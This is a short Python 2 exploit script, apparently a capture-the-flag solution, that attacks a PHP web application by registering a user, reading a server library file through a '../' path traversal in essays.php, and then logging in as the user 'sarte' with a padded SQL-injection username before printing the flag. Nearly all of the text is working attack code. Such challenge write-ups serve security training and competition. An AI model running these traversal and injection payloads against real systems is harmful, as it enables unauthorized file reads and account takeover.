#!/usr/bin/env python2

import sys
import requests
import re
import logging
import hashlib

# import httplib as http_client
# http_client.HTTPConnection.debuglevel = 1
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True

REAL_HASH = "a77cd79a0cde1f6a8122c9974fe803fdce13c4d6e15628502378369fdd650e6d"

def main():
    if len(sys.argv) != 2:
        print "usage: exploit.py <ip>:<port>"
        sys.exit(-1)
    
    ip, port = sys.argv[1].split(":")

    url = "http://%s:%s/" % (ip, port)


    username = "exploit"
    password = "exploit"

    # create this user if they don't exist
    payload = {'username': username, 'password': password}

    r = requests.post(url + "register.php", data=payload)

    # log in as this user
    r = requests.post(url + "login.php", data=payload, allow_redirects=False)
    cookies = r.cookies

    # test that we can extract mydb.so    
    mydb_so = "/usr/lib/php/20151012/mydb.so"

    r = requests.get(url + "essays.php?preview&name=../../../../../" + mydb_so, cookies=cookies, stream=True)
    response = ""
    for chunk in r.iter_content(chunk_size=128):
        response += chunk
    
    start = response.index('<pre>')
    start += len('<pre>')
    end = response.index('</pre>')

    mydb = response[start:end]
    h = hashlib.sha256(mydb).hexdigest()

    if REAL_HASH != h:
        print "ERROR, the hashes did not match!"
        return
    

    # exploit, log on as sarte
    exploit = 'a                                                                                                               users where username = "sarte"--'
    payload = {'username': exploit, 'password': "blag"}
    r = requests.post(url + "login.php", data=payload, cookies=cookies, allow_redirects=False)

    r = requests.get(url + "flag.php", cookies=cookies, allow_redirects=False)

    res = re.search("(ooo{.+})", r.text)
    print "FLAG:", res.groups()[0]

if __name__ == '__main__':
    main()
    
